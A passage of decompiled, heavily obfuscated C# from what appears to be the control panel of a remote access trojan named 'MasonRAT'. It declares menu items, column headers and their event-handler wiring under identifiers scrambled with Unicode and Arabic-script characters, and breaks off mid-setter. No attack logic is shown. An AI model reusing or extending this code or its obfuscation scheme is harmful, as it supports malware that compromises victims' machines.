  [field: AccessedThroughProperty("Guna2DragControl1")]
  internal virtual Guna2DragControl \u2694️MasonRAT\u270Cﻋټـــ\u060Fڅڇـءـۙ\u0608ڙۡ\u060Cٸۧۨ\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual Guna2ContextMenuStrip \u2694️MasonRAT\u270Cـــﯧ\u060Bـڝ\u060D\u0609\u060C\u060A\u0608ڣد
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Bةـ\u060Aٺــۏ\u060Aڙــﻻد\u060Aؤ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      CancelEventHandler cancelEventHandler = new CancelEventHandler(this.\u2694️MasonRAT\u270Cټټڙ\u060A\u0609ﻻئـ̍ـڠڙۭةبۛ\u060Aـ);
      Guna2ContextMenuStrip ratـةـٺــۏڙــﻻدؤ1 = this.\u2694️MasonRAT\u270Cـ\u060Bةـ\u060Aٺــۏ\u060Aڙــﻻد\u060Aؤ;
      if (ratـةـٺــۏڙــﻻدؤ1 != null)
        ratـةـٺــۏڙــﻻدؤ1.Opening -= cancelEventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060Bةـ\u060Aٺــۏ\u060Aڙــﻻد\u060Aؤ = value;
      Guna2ContextMenuStrip ratـةـٺــۏڙــﻻدؤ2 = this.\u2694️MasonRAT\u270Cـ\u060Bةـ\u060Aٺــۏ\u060Aڙــﻻد\u060Aؤ;
      if (ratـةـٺــۏڙــﻻدؤ2 == null)
        return;
      ratـةـٺــۏڙــﻻدؤ2.Opening += cancelEventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cٺ\u0609\u0608ـٸـڇ\u060Dٸۡـــٻـٺــْ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060Ąڙﻻ\u060Fـ\u0609ۏـּؤـۡ\u060Dڅ\u060Dــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـم\u060A\u060Aٺد\u060D\u0020ـ\u060D\u060A\u060C);
      ToolStripMenuItem ratـ̨ڙﻻـۏـּؤـۡڅــ1 = this.\u2694️MasonRAT\u270Cـ\u060Ąڙﻻ\u060Fـ\u0609ۏـּؤـۡ\u060Dڅ\u060Dــ;
      if (ratـ̨ڙﻻـۏـּؤـۡڅــ1 != null)
        ratـ̨ڙﻻـۏـּؤـۡڅــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060Ąڙﻻ\u060Fـ\u0609ۏـּؤـۡ\u060Dڅ\u060Dــ = value;
      ToolStripMenuItem ratـ̨ڙﻻـۏـּؤـۡڅــ2 = this.\u2694️MasonRAT\u270Cـ\u060Ąڙﻻ\u060Fـ\u0609ۏـּؤـۡ\u060Dڅ\u060Dــ;
      if (ratـ̨ڙﻻـۏـּؤـۡڅــ2 == null)
        return;
      ratـ̨ڙﻻـۏـּؤـۡڅــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608ڙ\u0608ـٽ\u060E\u0609ـب\u060Aمـڛـ\u060A\u0608ـٽ\u060A
  {
    get => this.\u2694️MasonRAT\u270Cۛ\u060D\u060F\u060Aﮪْــؤ\u060A\u060Dــۧـٸ\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aــ\u060Dــ\u0609ٸٻـ\u060Aٸىۚـڟـۡ\u0608ۡ);
      ToolStripMenuItem masonRatۛﮪْــؤــۧـٸ1 = this.\u2694️MasonRAT\u270Cۛ\u060D\u060F\u060Aﮪْــؤ\u060A\u060Dــۧـٸ\u0609;
      if (masonRatۛﮪْــؤــۧـٸ1 != null)
        masonRatۛﮪْــؤــۧـٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۛ\u060D\u060F\u060Aﮪْــؤ\u060A\u060Dــۧـٸ\u0609 = value;
      ToolStripMenuItem masonRatۛﮪْــؤــۧـٸ2 = this.\u2694️MasonRAT\u270Cۛ\u060D\u060F\u060Aﮪْــؤ\u060A\u060Dــۧـٸ\u0609;
      if (masonRatۛﮪْــؤــۧـٸ2 == null)
        return;
      masonRatۛﮪْــؤــۧـٸ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Eم\u0609ءڦ\u0609ٻۡد\u0608\u060A
  {
    get => this.\u2694️MasonRAT\u270Cٽدـټٺ\u0609ۙڙ\u060Bــټح;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﻋـ\u060Cــڙڙژ\u060Aـ\u0608ٽـٸ\u060B\u0609ــ);
      ToolStripMenuItem masonRatٽدـټٺۙڙــټح1 = this.\u2694️MasonRAT\u270Cٽدـټٺ\u0609ۙڙ\u060Bــټح;
      if (masonRatٽدـټٺۙڙــټح1 != null)
        masonRatٽدـټٺۙڙــټح1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cٽدـټٺ\u0609ۙڙ\u060Bــټح = value;
      ToolStripMenuItem masonRatٽدـټٺۙڙــټح2 = this.\u2694️MasonRAT\u270Cٽدـټٺ\u0609ۙڙ\u060Bــټح;
      if (masonRatٽدـټٺۙڙــټح2 == null)
        return;
      masonRatٽدـټٺۙڙــټح2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cحطبـڙﻋ\u060Eۛ\u060Eﻻـ\u060Dٸ\u060B\u0609؁
  {
    get => this.\u2694️MasonRAT\u270Cـڙڙ\u060C̍\u0020ــ̍ټـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ـ\u0608\u060B\u0608\u060A\u060Dﮪ\u060C\u060Aــ\u060Bؤڙ);
      ToolStripMenuItem masonRatـڙڙ̍ــ̍ټـ1 = this.\u2694️MasonRAT\u270Cـڙڙ\u060C̍\u0020ــ̍ټـ;
      if (masonRatـڙڙ̍ــ̍ټـ1 != null)
        masonRatـڙڙ̍ــ̍ټـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙڙ\u060C̍\u0020ــ̍ټـ = value;
      ToolStripMenuItem masonRatـڙڙ̍ــ̍ټـ2 = this.\u2694️MasonRAT\u270Cـڙڙ\u060C̍\u0020ــ̍ټـ;
      if (masonRatـڙڙ̍ــ̍ټـ2 == null)
        return;
      masonRatـڙڙ̍ــ̍ټـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــ\u060Dڝـژۚ\u060Cڇ\u060Fڣ\u060Dب\u060Aۧ\u060F\u060A
  {
    get => this.\u2694️MasonRAT\u270Cـۜڦۛڦﻋـۧـ\u060Eـ\u060D\u0609ٸ\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060A\u060Dٺ\u0608ۚ\u060A\u0609\u0609\u060E\u060B\u060Aڝ);
      ToolStripMenuItem masonRatـۜڦۛڦﻋـۧــٸ1 = this.\u2694️MasonRAT\u270Cـۜڦۛڦﻋـۧـ\u060Eـ\u060D\u0609ٸ\u0608;
      if (masonRatـۜڦۛڦﻋـۧــٸ1 != null)
        masonRatـۜڦۛڦﻋـۧــٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـۜڦۛڦﻋـۧـ\u060Eـ\u060D\u0609ٸ\u0608 = value;
      ToolStripMenuItem masonRatـۜڦۛڦﻋـۧــٸ2 = this.\u2694️MasonRAT\u270Cـۜڦۛڦﻋـۧـ\u060Eـ\u060D\u0609ٸ\u0608;
      if (masonRatـۜڦۛڦﻋـۧــٸ2 == null)
        return;
      masonRatـۜڦۛڦﻋـۧــٸ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ̍ح\u060Eـ\u060Dـ\u060Aڞ\u060Eٻڇـ\u0020\u060B̨\u0608̍ٺ
  {
    get => this.\u2694️MasonRAT\u270Cۨ\u060Dڙـۡ\u060Cـڠۜـ\u060Bڙـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙــ\u060B\u0608ڼ\u060D\u0608\u0608ـگـ\u060D\u060F\u060Aٺ\u060E\u0608);
      ToolStripMenuItem masonRatۨڙـۡـڠۜـڙـ1 = this.\u2694️MasonRAT\u270Cۨ\u060Dڙـۡ\u060Cـڠۜـ\u060Bڙـ;
      if (masonRatۨڙـۡـڠۜـڙـ1 != null)
        masonRatۨڙـۡـڠۜـڙـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۨ\u060Dڙـۡ\u060Cـڠۜـ\u060Bڙـ = value;
      ToolStripMenuItem masonRatۨڙـۡـڠۜـڙـ2 = this.\u2694️MasonRAT\u270Cۨ\u060Dڙـۡ\u060Cـڠۜـ\u060Bڙـ;
      if (masonRatۨڙـۡـڠۜـڙـ2 == null)
        return;
      masonRatۨڙـۡـڠۜـڙـ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem7")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڅ\u060Cـۡـڕــﻋـــ\u060F { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڙ\u060Aڇـب\u060Bــٽء
  {
    get => this.\u2694️MasonRAT\u270Cـּ̍\u0608ـﻋ\u0609ڞ\u0608ـ\u0609بــ\u0608ْـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0608\u060Dْڟـ\u060Dـٽ\u060Fـ\u0608بڙ\u060E\u060A);
      ToolStripMenuItem masonRatـּ̍ـﻋڞـبــْـ1 = this.\u2694️MasonRAT\u270Cـּ̍\u0608ـﻋ\u0609ڞ\u0608ـ\u0609بــ\u0608ْـ;
      if (masonRatـּ̍ـﻋڞـبــْـ1 != null)
        masonRatـּ̍ـﻋڞـبــْـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـּ̍\u0608ـﻋ\u0609ڞ\u0608ـ\u0609بــ\u0608ْـ = value;
      ToolStripMenuItem masonRatـּ̍ـﻋڞـبــْـ2 = this.\u2694️MasonRAT\u270Cـּ̍\u0608ـﻋ\u0609ڞ\u0608ـ\u0609بــ\u0608ْـ;
      if (masonRatـּ̍ـﻋڞـبــْـ2 == null)
        return;
      masonRatـּ̍ـﻋڞـبــْـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cژﻼ\u060D\u060D\u060E\u0608ٽــ\u060B
  {
    get => this.\u2694️MasonRAT\u270Cاــڝ\u060Aـ\u060E\u060Aــڦـڛـب\u060Dڦ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڝ̍ۛ\u060Dـــمڙ̍څڙ);
      ToolStripMenuItem ratاــڝـــڦـڛـبڦ1 = this.\u2694️MasonRAT\u270Cاــڝ\u060Aـ\u060E\u060Aــڦـڛـب\u060Dڦ;
      if (ratاــڝـــڦـڛـبڦ1 != null)
        ratاــڝـــڦـڛـبڦ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cاــڝ\u060Aـ\u060E\u060Aــڦـڛـب\u060Dڦ = value;
      ToolStripMenuItem ratاــڝـــڦـڛـبڦ2 = this.\u2694️MasonRAT\u270Cاــڝ\u060Aـ\u060E\u060Aــڦـڛـب\u060Dڦ;
      if (ratاــڝـــڦـڛـبڦ2 == null)
        return;
      ratاــڝـــڦـڛـبڦ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۨـ\u060Aــٺگــ\u060A\u0608ـ\u060Fڛﻼ
  {
    get => this.\u2694️MasonRAT\u270Cــ\u060Aـﻋ؁\u0609ـڙب\u060Dڙــاٸ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060C\u0608ۭڛء\u060Aـ\u060Dءۨ);
      ToolStripMenuItem ratـــﻋ؁ـڙبڙــاٸ1 = this.\u2694️MasonRAT\u270Cــ\u060Aـﻋ؁\u0609ـڙب\u060Dڙــاٸ;
      if (ratـــﻋ؁ـڙبڙــاٸ1 != null)
        ratـــﻋ؁ـڙبڙــاٸ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــ\u060Aـﻋ؁\u0609ـڙب\u060Dڙــاٸ = value;
      ToolStripMenuItem ratـــﻋ؁ـڙبڙــاٸ2 = this.\u2694️MasonRAT\u270Cــ\u060Aـﻋ؁\u0609ـڙب\u060Dڙــاٸ;
      if (ratـــﻋ؁ـڙبڙــاٸ2 == null)
        return;
      ratـــﻋ؁ـڙبڙــاٸ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Fـ\u0608د\u060A\u060Aـ\u060A\u0608\u060Dـــڇۨﻋـ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u060D\u060Eمۜ\u060Aٽـ\u0609\u060Aـاڟ\u060D\u060Fڙـ\u0609ـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ـ\u060Aــۜـ\u060Aٺـ\u0609ٸ\u060Dٽ\u060Aٻــ);
      ToolStripMenuItem masonRatـمۜٽــاڟڙــ1 = this.\u2694️MasonRAT\u270Cـ\u060D\u060Eمۜ\u060Aٽـ\u0609\u060Aـاڟ\u060D\u060Fڙـ\u0609ـ;
      if (masonRatـمۜٽــاڟڙــ1 != null)
        masonRatـمۜٽــاڟڙــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u060D\u060Eمۜ\u060Aٽـ\u0609\u060Aـاڟ\u060D\u060Fڙـ\u0609ـ = value;
      ToolStripMenuItem masonRatـمۜٽــاڟڙــ2 = this.\u2694️MasonRAT\u270Cـ\u060D\u060Eمۜ\u060Aٽـ\u0609\u060Aـاڟ\u060D\u060Fڙـ\u0609ـ;
      if (masonRatـمۜٽــاڟڙــ2 == null)
        return;
      masonRatـمۜٽــاڟڙــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڙ\u060D\u060A\u0609\u0609ﻻټ\u060Aاٺڙـۧڼ
  {
    get => this.\u2694️MasonRAT\u270C\u060D\u060Cڼ\u060D̍\u060Eۙ\u0609ـڙڕـڼؤ\u060A\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڟ\u0609̨ـ\u060Dــڙۡـ\u0020ڦـ);
      ToolStripMenuItem masonRatڼ̍ۙـڙڕـڼؤ1 = this.\u2694️MasonRAT\u270C\u060D\u060Cڼ\u060D̍\u060Eۙ\u0609ـڙڕـڼؤ\u060A\u060D;
      if (masonRatڼ̍ۙـڙڕـڼؤ1 != null)
        masonRatڼ̍ۙـڙڕـڼؤ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060D\u060Cڼ\u060D̍\u060Eۙ\u0609ـڙڕـڼؤ\u060A\u060D = value;
      ToolStripMenuItem masonRatڼ̍ۙـڙڕـڼؤ2 = this.\u2694️MasonRAT\u270C\u060D\u060Cڼ\u060D̍\u060Eۙ\u0609ـڙڕـڼؤ\u060A\u060D;
      if (masonRatڼ̍ۙـڙڕـڼؤ2 == null)
        return;
      masonRatڼ̍ۙـڙڕـڼؤ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060F\u060Dـڇْحـ\u060Bـ̍ٸ\u060C\u0020\u0608
  {
    get => this.\u2694️MasonRAT\u270C\u060Aڙىۛ\u0609ـٸڠ̍ۚـ\u060B;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dٸ\u060Aــ\u060Aئ\u060B̍ڙط\u060C\u060Bڠ);
      ToolStripMenuItem masonRatڙىۛـٸڠ̍ۚـ1 = this.\u2694️MasonRAT\u270C\u060Aڙىۛ\u0609ـٸڠ̍ۚـ\u060B;
      if (masonRatڙىۛـٸڠ̍ۚـ1 != null)
        masonRatڙىۛـٸڠ̍ۚـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Aڙىۛ\u0609ـٸڠ̍ۚـ\u060B = value;
      ToolStripMenuItem masonRatڙىۛـٸڠ̍ۚـ2 = this.\u2694️MasonRAT\u270C\u060Aڙىۛ\u0609ـٸڠ̍ۚـ\u060B;
      if (masonRatڙىۛـٸڠ̍ۚـ2 == null)
        return;
      masonRatڙىۛـٸڠ̍ۚـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڅ\u0608ۡـۧۡ\u060Eـ\u0608ئ\u0608\u060Aدﻋ\u060Bڙ
  {
    get
    {
      return this.\u2694️MasonRAT\u270C\u0608ئ\u060Fٽـڕئٻ\u0608ـﻋڦ\u0608ؤ\u0609\u060F\u060A\u060A\u0609ڙ;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cْڝۏ\u060Cـ؁ــ\u0608ﻻ\u060Bـ);
      ToolStripMenuItem masonRatئٽـڕئٻـﻋڦؤڙ1 = this.\u2694️MasonRAT\u270C\u0608ئ\u060Fٽـڕئٻ\u0608ـﻋڦ\u0608ؤ\u0609\u060F\u060A\u060A\u0609ڙ;
      if (masonRatئٽـڕئٻـﻋڦؤڙ1 != null)
        masonRatئٽـڕئٻـﻋڦؤڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608ئ\u060Fٽـڕئٻ\u0608ـﻋڦ\u0608ؤ\u0609\u060F\u060A\u060A\u0609ڙ = value;
      ToolStripMenuItem masonRatئٽـڕئٻـﻋڦؤڙ2 = this.\u2694️MasonRAT\u270C\u0608ئ\u060Fٽـڕئٻ\u0608ـﻋڦ\u0608ؤ\u0609\u060F\u060A\u060A\u0609ڙ;
      if (masonRatئٽـڕئٻـﻋڦؤڙ2 == null)
        return;
      masonRatئٽـڕئٻـﻋڦؤڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cټ\u060Aــ\u0609\u0608\u060Eٸ\u060A\u060Cـۧءﻻ\u0608ڙڙ\u060Aڙ
  {
    get => this.\u2694️MasonRAT\u270Cـ\u0608\u060Bـ\u060Bڣڕ\u060C̨ـ\u060Fﻻـڙڙــ\u060Fٽ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Cۡڙڙـا\u060B\u060A\u060Aﮪ\u060D\u0608ـ);
      ToolStripMenuItem ratــڣڕ̨ـﻻـڙڙــٽ1 = this.\u2694️MasonRAT\u270Cـ\u0608\u060Bـ\u060Bڣڕ\u060C̨ـ\u060Fﻻـڙڙــ\u060Fٽ;
      if (ratــڣڕ̨ـﻻـڙڙــٽ1 != null)
        ratــڣڕ̨ـﻻـڙڙــٽ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u0608\u060Bـ\u060Bڣڕ\u060C̨ـ\u060Fﻻـڙڙــ\u060Fٽ = value;
      ToolStripMenuItem ratــڣڕ̨ـﻻـڙڙــٽ2 = this.\u2694️MasonRAT\u270Cـ\u0608\u060Bـ\u060Bڣڕ\u060C̨ـ\u060Fﻻـڙڙــ\u060Fٽ;
      if (ratــڣڕ̨ـﻻـڙڙــٽ2 == null)
        return;
      ratــڣڕ̨ـﻻـڙڙــٽ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem16")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cؤ\u060Fـ\u060A\u0608ح\u0020ڇـ\u0608ـۜٺـڙگى\u0609\u060F { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـــ\u060Aـۛـ\u0609ٺــ
  {
    get => this.\u2694️MasonRAT\u270Cۧ\u060Aـڼـڙ\u0609ـۏ\u0608ْژ\u060A\u060D؁\u0609\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـب̨ـةڙ\u060Aــ\u060Fـ\u060A̍ـټڙ);
      ToolStripMenuItem masonRatۧـڼـڙـۏْژ؁1 = this.\u2694️MasonRAT\u270Cۧ\u060Aـڼـڙ\u0609ـۏ\u0608ْژ\u060A\u060D؁\u0609\u060A;
      if (masonRatۧـڼـڙـۏْژ؁1 != null)
        masonRatۧـڼـڙـۏْژ؁1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۧ\u060Aـڼـڙ\u0609ـۏ\u0608ْژ\u060A\u060D؁\u0609\u060A = value;
      ToolStripMenuItem masonRatۧـڼـڙـۏْژ؁2 = this.\u2694️MasonRAT\u270Cۧ\u060Aـڼـڙ\u0609ـۏ\u0608ْژ\u060A\u060D؁\u0609\u060A;
      if (masonRatۧـڼـڙـۏْژ؁2 == null)
        return;
      masonRatۧـڼـڙـۏْژ؁2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060A\u0608\u060Fٻ̍\u060Aـح\u0608ﻼڟ\u060B
  {
    get => this.\u2694️MasonRAT\u270Cبﯧﯧــﮪټ\u0020\u0608ۏ\u0608\u060D\u0609ﻻ\u0609ــ\u0608\u060Cـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڠ؁ـٺـڙمڜ\u060Bـ\u060Fۧٸـۏد\u060Aٸ);
      ToolStripMenuItem masonRatبﯧﯧــﮪټۏﻻـــ1 = this.\u2694️MasonRAT\u270Cبﯧﯧــﮪټ\u0020\u0608ۏ\u0608\u060D\u0609ﻻ\u0609ــ\u0608\u060Cـ;
      if (masonRatبﯧﯧــﮪټۏﻻـــ1 != null)
        masonRatبﯧﯧــﮪټۏﻻـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cبﯧﯧــﮪټ\u0020\u0608ۏ\u0608\u060D\u0609ﻻ\u0609ــ\u0608\u060Cـ = value;
      ToolStripMenuItem masonRatبﯧﯧــﮪټۏﻻـــ2 = this.\u2694️MasonRAT\u270Cبﯧﯧــﮪټ\u0020\u0608ۏ\u0608\u060D\u0609ﻻ\u0609ــ\u0608\u060Cـ;
      if (masonRatبﯧﯧــﮪټۏﻻـــ2 == null)
        return;
      masonRatبﯧﯧــﮪټۏﻻـــ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripMenuItem19")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060A\u060Aـۜــٺ\u0609ٺـ\u060Fة { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0020\u0608\u060Fۙﯧژــْـ\u060Dڦ\u0608ب\u060Dٽ\u060F
  {
    get => this.\u2694️MasonRAT\u270Cټ\u060A\u0609د\u0609ۙـگ\u060C\u0020\u060Aۧ\u0608ـ\u060B\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڦـڞ\u060Dــ\u060A\u060Bڼٸ\u060Aڣ\u0609\u060Cـ\u060Cڝ\u060D);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cټ\u060A\u0609د\u0609ۙـگ\u060C\u0020\u060Aۧ\u0608ـ\u060B\u0609;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cټ\u060A\u0609د\u0609ۙـگ\u060C\u0020\u060Aۧ\u0608ـ\u060B\u0609 = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cټ\u060A\u0609د\u0609ۙـگ\u060C\u0020\u060Aۧ\u0608ـ\u060B\u0609;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Dٸڕ\u0609ۡ\u0608ـح\u0609طڙ\u060Fۙڙ\u060Eټـ\u060Aـ
  {
    get => this.\u2694️MasonRAT\u270Cڅۚﯧ\u0609ــۡـ\u0608ـ̍ڙ\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609ۡڙټــ\u0020ۛۙۨةـــ);
      ToolStripMenuItem masonRatڅۚﯧــۡــ̍ڙ1 = this.\u2694️MasonRAT\u270Cڅۚﯧ\u0609ــۡـ\u0608ـ̍ڙ\u060D;
      if (masonRatڅۚﯧــۡــ̍ڙ1 != null)
        masonRatڅۚﯧــۡــ̍ڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڅۚﯧ\u0609ــۡـ\u0608ـ̍ڙ\u060D = value;
      ToolStripMenuItem masonRatڅۚﯧــۡــ̍ڙ2 = this.\u2694️MasonRAT\u270Cڅۚﯧ\u0609ــۡـ\u0608ـ̍ڙ\u060D;
      if (masonRatڅۚﯧــۡــ̍ڙ2 == null)
        return;
      masonRatڅۚﯧــۡــ̍ڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙ\u060Bـ؁ــ\u060F\u060Aح\u060A\u0608̍\u060A
  {
    get => this.\u2694️MasonRAT\u270C\u060D\u0020ﻋـ\u0609ـۚ\u060Dٸ؁ڙــۏ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cبۡ\u060Bـڙـڇ\u0608\u060D\u060D);
      ToolStripMenuItem masonRatﻋــۚٸ؁ڙــۏ1 = this.\u2694️MasonRAT\u270C\u060D\u0020ﻋـ\u0609ـۚ\u060Dٸ؁ڙــۏ;
      if (masonRatﻋــۚٸ؁ڙــۏ1 != null)
        masonRatﻋــۚٸ؁ڙــۏ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060D\u0020ﻋـ\u0609ـۚ\u060Dٸ؁ڙــۏ = value;
      ToolStripMenuItem masonRatﻋــۚٸ؁ڙــۏ2 = this.\u2694️MasonRAT\u270C\u060D\u0020ﻋـ\u0609ـۚ\u060Dٸ؁ڙــۏ;
      if (masonRatﻋــۚٸ؁ڙــۏ2 == null)
        return;
      masonRatﻋــۚٸ؁ڙــۏ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ColumnHeader3")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060Fۜ\u060Fڼـ\u0609ـ\u0609ـۡٺـڟ\u060E\u0609\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader4")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cــگۡ\u060Dـحﻼـ\u0609ـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader5")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cــۜڙ\u0608ټط\u0608\u0020\u060C\u0020ڙ\u060Aـاط\u0609د\u060C\u060A { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader6")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0020ـ\u060Fـةڞټ\u0608\u060B\u060B\u0609\u060A\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader7")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060Dۙــ\u060Dب\u060Aڠ̍ـئ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader8")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cـدڙﻋب\u060Eـۏْڙـۛۡـةﻻـ\u060C̍ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader9")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060Dــ\u0608̍ڙ̍ح\u060Fـﻋﻋـۡ\u060B\u060F\u060Aـۚ\u060D { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڠـڙـۙ\u060Eـۙﮪم\u0020\u0608ﻋ\u0608\u060Aٸٻ
  {
    get => this.\u2694️MasonRAT\u270Cڟﻋۡـ\u060Aٻ̍ـڅ̨ۙڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cּـڙۡٺ\u060Dحـــ\u060Aۡڜټ\u060Dـۏ);
      ToolStripMenuItem masonRatڟﻋۡـٻ̍ـڅ̨ۙڙ1 = this.\u2694️MasonRAT\u270Cڟﻋۡـ\u060Aٻ̍ـڅ̨ۙڙ;
      if (masonRatڟﻋۡـٻ̍ـڅ̨ۙڙ1 != null)
